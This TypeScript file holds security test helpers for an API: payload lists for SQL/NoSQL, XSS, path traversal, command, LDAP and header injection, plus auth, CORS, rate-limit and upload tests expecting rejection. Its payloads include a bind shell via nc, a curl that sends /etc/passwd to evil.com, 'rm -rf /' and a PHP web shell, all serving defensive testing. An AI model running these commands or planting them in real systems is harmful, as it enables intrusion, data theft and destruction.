/**
 * Security Test Utilities
 * Specialized utilities for testing security aspects and vulnerabilities
 * Part of 7-Player Test Architecture - Foundation Layer
 */

import { APIEventBuilder } from './api-test-utils';

// Security Test Payloads
export const SECURITY_PAYLOADS = {
  // SQL/NoSQL Injection attempts
  injection: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "admin'--",
    "admin'/*",
    "' OR 1=1#",
    "' UNION SELECT * FROM users--",
    "1' AND (SELECT COUNT(*) FROM users) > 0--",
    // NoSQL injection
    "{'$ne': null}",
    "{'$gt': ''}",
    "{'$where': 'this.username == this.password'}",
    "{'$regex': '.*'}",
    "'; return true; var x='",
    "1; return {username: 1, password: 1}; var x=1"
  ],

  // XSS attempts
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<<SCRIPT>alert('XSS')<</SCRIPT>",
    "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>"
  ],

  // Path traversal attempts
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "../../../../../../etc/passwd%00.jpg",
    "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
  ],

  // Command injection attempts
  commandInjection: [
    "; ls -la",
    "| cat /etc/passwd",
    "&& whoami",
    "`id`",
    "$(whoami)",
    "; rm -rf /",
    "| nc -l -p 1234 -e /bin/sh",
    "&& curl http://evil.com/steal?data=$(cat /etc/passwd)",
    "; python -c 'import os; os.system(\"ls\")'",
    "| powershell.exe Get-Process"
  ],

  // LDAP injection attempts
  ldapInjection: [
    "*)(uid=*",
    "*)(|(uid=*",
    "*)(&(uid=*",
    "*))%00",
    "admin)(&(password=*))",
    "*)(cn=*))((objectClass=*",
    "*))(|(cn=*",
    "*)(objectClass=*)(cn=*"
  ],

  // Header injection attempts
  headerInjection: [
    "test\r\nX-Injected: true",
    "test\nX-Injected: true",
    "test\r\n\r\n<script>alert('XSS')</script>",
    "test%0d%0aX-Injected:%20true",
    "test%0aX-Injected:%20true",
    "test\r\nSet-Cookie: admin=true"
  ],

  // Large payloads for DoS testing
  largePaylods: {
    string: 'A'.repeat(1000000), // 1MB string
    array: Array(10000).fill('test'), // Large array
    object: Object.fromEntries(Array(1000).fill(0).map((_, i) => [`key${i}`, `value${i}`])), // Large object
    nestedObject: {
      level1: {
        level2: {
          level3: {
            level4: {
              level5: 'A'.repeat(100000)
            }
          }
        }
      }
    }
  }
};

// Security Test Helper
export class SecurityTestHelper {
  // Input validation testing
  testInputValidation(createRequest: (input: any) => any, field: string) {
    const tests: Array<{name: string, request: any, expectedStatus: number}> = [];

    // Test injection payloads
    SECURITY_PAYLOADS.injection.forEach(payload => {
      tests.push({
        name: `should reject SQL/NoSQL injection in ${field}`,
        request: createRequest({ [field]: payload }),
        expectedStatus: 400
      });
    });

    // Test XSS payloads
    SECURITY_PAYLOADS.xss.forEach(payload => {
      tests.push({
        name: `should reject XSS payload in ${field}`,
        request: createRequest({ [field]: payload }),
        expectedStatus: 400
      });
    });

    // Test path traversal
    SECURITY_PAYLOADS.pathTraversal.forEach(payload => {
      tests.push({
        name: `should reject path traversal in ${field}`,
        request: createRequest({ [field]: payload }),
        expectedStatus: 400
      });
    });

    return tests;
  }

  // Authentication bypass testing
  createAuthBypassTests(protectedEndpoint: string) {
    return [
      {
        name: 'should reject request without authorization header',
        request: new APIEventBuilder().method('GET').path(protectedEndpoint).build(),
        expectedStatus: 401
      },
      {
        name: 'should reject request with invalid token format',
        request: new APIEventBuilder()
          .method('GET')
          .path(protectedEndpoint)
          .headers({ 'Authorization': 'invalid-format' })
          .build(),
        expectedStatus: 401
      },
      {
        name: 'should reject request with malformed JWT',
        request: new APIEventBuilder()
          .method('GET')
          .path(protectedEndpoint)
          .headers({ 'Authorization': 'Bearer invalid.jwt.token' })
          .build(),
        expectedStatus: 401
      },
      {
        name: 'should reject request with expired token',
        request: new APIEventBuilder()
          .method('GET')
          .path(protectedEndpoint)
          .headers({ 'Authorization': 'Bearer expired-token' })
          .build(),
        expectedStatus: 401
      },
      {
        name: 'should reject request with revoked token',
        request: new APIEventBuilder()
          .method('GET')
          .path(protectedEndpoint)
          .headers({ 'Authorization': 'Bearer revoked-token' })
          .build(),
        expectedStatus: 401
      }
    ];
  }

  // Authorization testing
  createAuthorizationTests(endpoint: string, validUserId: string, otherUserId: string) {
    return [
      {
        name: 'should allow access to own resources',
        request: new APIEventBuilder()
          .method('GET')
          .path(endpoint)
          .auth(validUserId)
          .build(),
        expectedStatus: 200
      },
      {
        name: 'should deny access to other users resources',
        request: new APIEventBuilder()
          .method('GET')
          .path(endpoint)
          .auth(otherUserId)
          .build(),
        expectedStatus: 403
      },
      {
        name: 'should deny privilege escalation attempts',
        request: new APIEventBuilder()
          .method('GET')
          .path(endpoint)
          .auth(otherUserId)
          .headers({ 'X-Admin-Override': 'true' })
          .build(),
        expectedStatus: 403
      }
    ];
  }

  // Rate limiting tests
  createRateLimitTests(endpoint: string, userId: string, limit: number) {
    const requests: Array<{name: string, request: any, expectedStatus: number}> = [];
    
    // Create requests up to the limit
    for (let i = 0; i < limit + 5; i++) {
      requests.push({
        name: `request ${i + 1}`,
        request: new APIEventBuilder()
          .method('GET')
          .path(endpoint)
          .auth(userId)
          .build(),
        expectedStatus: i < limit ? 200 : 429
      });
    }
    
    return requests;
  }

  // CORS security tests
  createCORSTests(endpoint: string) {
    return [
      {
        name: 'should handle preflight OPTIONS request',
        request: new APIEventBuilder()
          .method('OPTIONS')
          .path(endpoint)
          .headers({
            'Origin': 'https://allowed-domain.com',
            'Access-Control-Request-Method': 'POST',
            'Access-Control-Request-Headers': 'Content-Type,Authorization'
          })
          .build(),
        expectedStatus: 200
      },
      {
        name: 'should reject requests from unauthorized origins',
        request: new APIEventBuilder()
          .method('GET')
          .path(endpoint)
          .headers({ 'Origin': 'https://malicious-domain.com' })
          .build(),
        expectedStatus: 403
      },
      {
        name: 'should include proper CORS headers in response',
        request: new APIEventBuilder()
          .method('GET')
          .path(endpoint)
          .headers({ 'Origin': 'https://allowed-domain.com' })
          .build(),
        expectedHeaders: {
          'Access-Control-Allow-Origin': 'https://allowed-domain.com',
          'Access-Control-Allow-Credentials': 'true'
        }
      }
    ];
  }

  // Content Security Policy tests
  createCSPTests() {
    return [
      {
        name: 'should include CSP headers',
        expectedHeaders: {
          'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
        }
      },
      {
        name: 'should include X-Content-Type-Options header',
        expectedHeaders: {
          'X-Content-Type-Options': 'nosniff'
        }
      },
      {
        name: 'should include X-Frame-Options header',
        expectedHeaders: {
          'X-Frame-Options': 'DENY'
        }
      },
      {
        name: 'should include X-XSS-Protection header',
        expectedHeaders: {
          'X-XSS-Protection': '1; mode=block'
        }
      }
    ];
  }

  // File upload security tests
  createFileUploadSecurityTests(uploadEndpoint: string) {
    return [
      {
        name: 'should reject executable files',
        files: [
          { name: 'malware.exe', content: 'MZ\x90\x00', mimeType: 'application/octet-stream' },
          { name: 'script.php', content: '<?php system($_GET["cmd"]); ?>', mimeType: 'application/x-php' },
          { name: 'shell.sh', content: '#!/bin/bash\nrm -rf /', mimeType: 'application/x-sh' }
        ],
        expectedStatus: 400
      },
      {
        name: 'should reject files with dangerous extensions',
        files: [
          { name: 'image.jpg.exe', content: 'fake image', mimeType: 'image/jpeg' },
          { name: 'document.pdf.js', content: 'alert("xss")', mimeType: 'application/pdf' }
        ],
        expectedStatus: 400
      },
      {
        name: 'should reject oversized files',
        files: [
          { name: 'large.jpg', content: 'A'.repeat(10 * 1024 * 1024), mimeType: 'image/jpeg' } // 10MB
        ],
        expectedStatus: 413
      },
      {
        name: 'should validate file content matches extension',
        files: [
          { name: 'fake.jpg', content: '<script>alert("xss")</script>', mimeType: 'image/jpeg' },
          { name: 'fake.pdf', content: 'not a pdf', mimeType: 'application/pdf' }
        ],
        expectedStatus: 400
      }
    ];
  }
}

// Security Assertion Helpers
export const expectSecureHeaders = (headers: Record<string, string>) => {
  // Check for security headers
  expect(headers).toHaveProperty('X-Content-Type-Options');
  expect(headers['X-Content-Type-Options']).toBe('nosniff');
  
  expect(headers).toHaveProperty('X-Frame-Options');
  expect(headers['X-Frame-Options']).toMatch(/^(DENY|SAMEORIGIN)$/);
  
  expect(headers).toHaveProperty('X-XSS-Protection');
  expect(headers['X-XSS-Protection']).toBe('1; mode=block');
  
  // Check for HSTS if HTTPS
  if (headers['X-Forwarded-Proto'] === 'https') {
    expect(headers).toHaveProperty('Strict-Transport-Security');
  }
};

export const expectSanitizedOutput = (output: string) => {
  // Check that output doesn't contain dangerous characters
  expect(output).not.toMatch(/<script/i);
  expect(output).not.toMatch(/javascript:/i);
  expect(output).not.toMatch(/on\w+\s*=/i); // onclick, onload, etc.
  expect(output).not.toMatch(/data:text\/html/i);
  expect(output).not.toMatch(/vbscript:/i);
};

export const expectValidatedInput = (input: any, schema: any) => {
  // Validate that input conforms to expected schema
  Object.entries(schema).forEach(([field, rules]: [string, any]) => {
    if (rules.required && input[field] === undefined) {
      throw new Error(`Required field ${field} is missing`);
    }
    
    if (input[field] !== undefined) {
      if (rules.type && typeof input[field] !== rules.type) {
        throw new Error(`Field ${field} must be of type ${rules.type}`);
      }
      
      if (rules.maxLength && input[field].length > rules.maxLength) {
        throw new Error(`Field ${field} exceeds maximum length`);
      }
      
      if (rules.pattern && !new RegExp(rules.pattern).test(input[field])) {
        throw new Error(`Field ${field} does not match required pattern`);
      }
    }
  });
};

// Common Security Test Scenarios
export const createSecurityTestScenarios = {
  // Authentication scenarios
  authentication: (endpoint: string) => new SecurityTestHelper().createAuthBypassTests(endpoint),
  
  // Authorization scenarios  
  authorization: (endpoint: string, userId: string, otherUserId: string) => 
    new SecurityTestHelper().createAuthorizationTests(endpoint, userId, otherUserId),
  
  // Input validation scenarios
  inputValidation: (createRequest: (input: any) => any, field: string) =>
    new SecurityTestHelper().testInputValidation(createRequest, field),
  
  // CORS scenarios
  cors: (endpoint: string) => new SecurityTestHelper().createCORSTests(endpoint),
  
  // Rate limiting scenarios
  rateLimit: (endpoint: string, userId: string, limit: number) =>
    new SecurityTestHelper().createRateLimitTests(endpoint, userId, limit),
  
  // File upload security scenarios
  fileUpload: (endpoint: string) => new SecurityTestHelper().createFileUploadSecurityTests(endpoint)
};

// Security Test Data
export const SECURITY_TEST_DATA = {
  // Malicious usernames
  maliciousUsernames: [
    "admin'; DROP TABLE users; --",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "admin\r\nX-Injected: true",
    "null\x00admin",
    "admin\u0000"
  ],
  
  // Malicious emails
  maliciousEmails: [
    "test@evil.com<script>alert('xss')</script>",
    "test'; DROP TABLE users; --@example.com",
    "test@example.com\r\nBcc: admin@company.com",
    "test+<script>@example.com"
  ],
  
  // Malicious file names
  maliciousFileNames: [
    "../../../etc/passwd",
    "file.jpg.exe",
    "file\x00.jpg",
    "CON.jpg", // Windows reserved name
    "file<script>.jpg",
    "file\r\n.jpg"
  ],
  
  // Common passwords for brute force testing
  commonPasswords: [
    "password", "123456", "password123", "admin", "qwerty",
    "letmein", "welcome", "monkey", "1234567890", "password1"
  ]
};